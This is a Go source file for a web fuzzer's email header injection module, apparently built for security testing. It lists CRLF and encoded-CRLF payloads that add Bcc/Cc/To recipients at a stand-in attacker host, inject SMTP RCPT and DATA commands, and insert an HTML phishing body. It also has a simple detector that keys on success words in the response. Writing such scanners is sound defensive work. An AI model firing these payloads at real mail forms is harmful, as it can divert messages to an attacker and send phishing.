package vulns

import (
	"strings"

	"github.com/renansj/ryofuzz/internal/input"
	"github.com/renansj/ryofuzz/internal/mutator"
)

type EmailInjectModule struct{}

func (m *EmailInjectModule) Name() string        { return "email-inj" }
func (m *EmailInjectModule) Description() string { return "Email Header Injection" }

func (m *EmailInjectModule) GeneratePayloads(points []input.InjectionPoint, mode string, mutations int) []mutator.Payload {
	var payloads []mutator.Payload

	emailPayloads := []struct {
		value   string
		variant string
	}{
		{"victim@test.com\r\nBcc: attacker@evil.com", "crlf-bcc"},
		{"victim@test.com%0d%0aBcc: attacker@evil.com", "encoded-bcc"},
		{"victim@test.com\r\nCc: attacker@evil.com", "crlf-cc"},
		{"%0d%0aCc: attacker@evil.com", "encoded-cc"},
		{"victim@test.com\nBcc: attacker@evil.com", "lf-bcc"},
		{"victim@test.com\r\nTo: attacker@evil.com", "crlf-to"},
		{"victim@test.com\r\nSubject: Hijacked", "crlf-subject"},
		{"test\r\nRCPT TO:<attacker@evil.com>", "smtp-rcpt"},
		{"test%0d%0aDATA%0d%0aSubject: pwned", "smtp-data"},
		{"\"attacker@evil.com\\n\" <legit@test.com>", "quoted-inject"},
		{"victim@test.com\r\nContent-Type: text/html\r\n\r\n<h1>Phish</h1>", "body-inject"},
	}

	for _, point := range points {
		for _, p := range emailPayloads {
			payloads = append(payloads, mutator.Payload{
				Value: p.value, Point: point, Module: "email-inj", Variant: p.variant,
			})
		}
	}
	return payloads
}

func (m *EmailInjectModule) Detect(payload mutator.Payload, baseBody string, baseStatus int, baseTime int64,
	respBody string, respStatus int, respTime int64, respHeaders map[string][]string) *Finding {

	if respStatus >= 400 {
		return nil
	}

	bodyLower := strings.ToLower(respBody)
	successIndicators := []string{"sent", "success", "queued", "delivered", "message sent", "email sent", "mail sent"}

	emailSent := false
	for _, ind := range successIndicators {
		if strings.Contains(bodyLower, ind) {
			emailSent = true
			break
		}
	}

	if !emailSent {
		return nil
	}

	// Check that baseline also has success (normal flow) and payload has injection chars
	hasInjection := strings.Contains(payload.Value, "\r\n") || strings.Contains(payload.Value, "%0d%0a") ||
		strings.Contains(payload.Value, "\n") || strings.Contains(payload.Value, "RCPT")

	if !hasInjection {
		return nil
	}

	return &Finding{
		Module:      "email-inj",
		Severity:    "high",
		Confidence:  "high",
		Title:       "Email Header Injection - Extra recipients/headers injected",
		Description: "The application processes email with injected CRLF headers, allowing attacker to add recipients or modify email content",
		Payload:     payload.Value,
		Point:       payload.Point,
		Evidence:    "Email accepted with injection payload; success indicator in response",
		OWASP:       "A03:2021",
		CWE:         "CWE-93",
	}
}
